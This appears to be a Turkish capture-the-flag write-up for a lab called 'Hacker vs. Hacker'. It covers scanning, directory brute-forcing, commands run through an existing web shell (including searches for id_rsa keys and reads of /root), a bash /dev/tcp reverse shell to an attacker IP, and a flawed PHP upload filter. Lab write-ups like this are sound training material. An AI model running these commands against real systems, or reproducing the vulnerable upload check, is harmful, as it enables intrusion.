Hacker vs. Hacker
Birisi bu sunucuyu zaten ele geçirdi! İçeri girip önlemlerinden kaçınabilir misin?

🔐 Tarama
Bir makineye saldırı yapmadan önce, o makinenin açık olan servislerini ve portlarını öğrenmek gerekir. Bu, nereden başlayacağımızı anlamamızı sağlar. Portlar ve servisler hakkında bilgi almak için Nmap kullanıyoruz:

-sV: Servis versiyonlarını öğrenmek için
-sC: Yaygın scriptleri çalıştırmak için kullanılır.

<pre>nmap -sC -sV 10.81.185.192</pre>
GÖRSEL 1: Nmap tarama sonucu 
<img width="789" height="320" alt="image" src="https://github.com/user-attachments/assets/1c0cc8f7-a66e-4862-8ae0-074eb8d0c840" />


Bulunan Portlar:

22/tcp: SSH (OpenSSH 8.2p1 Ubuntu)
80/tcp: HTTP (Apache 2.4.41)

🔐 Web Servisine Erişim
Tarama sonucu web sunucusunun (port 80) açık olduğunu gördük. İlk adım olarak, web sitesine erişim sağlıyoruz:

<pre>http://10.81.185.192</pre>
GÖRSEL 2: Ana web sayfası 
<img width="1116" height="666" alt="image" src="https://github.com/user-attachments/assets/9a9fd6f7-1a80-4008-a954-b429dd1091df" />


Web sitesi "RecruitSec" adında bir güvenlik danışmanlığı firmasının sitesi gibi görünüyor. Sayfanın alt kısmında CV yükleme formu bulunuyor.

🔐 Sayfa Kaynağı İncelemesi
Web sayfalarında genellikle yorum satırları veya gizli bilgiler bırakılabilir. Sayfa kaynağına (Ctrl+U) bakarak, saldırıya veya ipuçlarına yarayacak herhangi bir bilgi var mı diye kontrol ediyoruz.

GÖRSEL 3: Sayfa kaynağı görseli 
<img width="1216" height="793" alt="image" src="https://github.com/user-attachments/assets/849bb531-5c5f-45a7-adb9-15b147b947a8" />


Sayfa kaynağında kritik bir yorum bulduk:

<pre>&lt;!-- im no security expert - thats what we have a stable of nerds for - but isn't /cvs on the public website a privacy risk? --&gt;</pre>
Bu yorum bize /cvs dizininin public olarak erişilebilir olduğunu ve potansiyel bir güvenlik riski oluşturduğunu gösteriyor.

🔐 Gizli Dosya ve Dizinleri Bulma
Web sunucusunda, normalde erişim sağlanmayan veya gizli olan dizin ve dosyalar olabilir. Bunlar bazen önemli bilgiler içerebilir. Bunun için Gobuster gibi araçlarla dizin taraması yapıyoruz:

<pre>gobuster dir --no-error -u http://10.81.185.192/cvs -w /usr/share/dirb/wordlists/common.txt -x .pdf.php</pre>
GÖRSEL 4: Gobuster tarama sonucu 
<img width="821" height="476" alt="image" src="https://github.com/user-attachments/assets/eca6f9ea-4299-4517-8e70-0c60b237cc5e" />


Bulunan kritik dosya:

/cvs/shell.pdf.php → Başka bir hacker'ın yüklediği web shell

🔐 Hacker'ın Shell'ini Keşfetme
Dizin taramasında başka bir hacker'ın yüklediği shell'i keşfettik. Bu shell'e erişim sağladık:

<pre>http://10.81.185.192/cvs/shell.pdf.php?cmd=whoami</pre>
GÖRSEL 5: Shell çalıştırma sonucu 
<img width="1036" height="552" alt="image" src="https://github.com/user-attachments/assets/2c983a24-4ba4-45ee-b3d5-8be359a73bf0" />


Çıktı: www-data

Shell çalışıyor ve bize "boom!" mesajı gösteriyor. Bu, hacker'ın shell'inin aktif olduğunu gösteriyor.

🔐 Sistem Keşfi
Web shell üzerinden sistemde keşif yapmaya başladık:

<pre># Home dizinindeki kullanıcıları listele http://10.81.185.192/cvs/shell.pdf.php?cmd=ls+/home # user.txt flag'ini ara http://10.81.185.192/cvs/shell.pdf.php?cmd=find+/home+-name+user.txt # Sistemdeki tüm txt dosyalarını ara http://10.81.185.192/cvs/shell.pdf.php?cmd=find+/+-name+*.txt+-type+f+2>/dev/null # SSH anahtarlarını ara http://10.81.185.192/cvs/shell.pdf.php?cmd=find+/home+-name+id_rsa+-type+f+2>/dev/null</pre>
🔐 Flag'leri Okuma
Bulduğumuz user ve flag dosyalarını okuduk:

<pre># user.txt flag'ini oku http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/home/[KULLANICI_ADI]/user.txt # proof.txt flag'ini oku (root dizininde) http://10.81.185.192/cvs/shell.pdf.php?cmd=cat+/root/proof.txt</pre>
🔐 Reverse Shell ile Kalıcı Erişim
Web shell üzerinden reverse shell alarak kalıcı erişim sağladık:

<pre># Dinleyici başlat nc -lvnp 4444 # Reverse shell tetikle http://10.81.185.192/cvs/shell.pdf.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.23.164.70/4444%200>%261'</pre>
🔐 File Upload Zafiyeti Analizi
Upload sayfasının kaynak kodunda zafiyetli filtreleme bulduk:

<pre>$target_dir = "cvs/"; $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]); if (!strpos($target_file, ".pdf")) { echo "Only PDF CVs are accepted."; } else if (file_exists($target_file)) { echo "This CV has already been uploaded!"; } else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) { echo "Success! We will get back to you."; } else { echo "Something went wrong :|"; }</pre>
Zafiyet: strpos() fonksiyonu sadece ".pdf" substring'ini arıyor, bu nedenle shell.php.pdf gibi dosyalar kabul ediliyor.
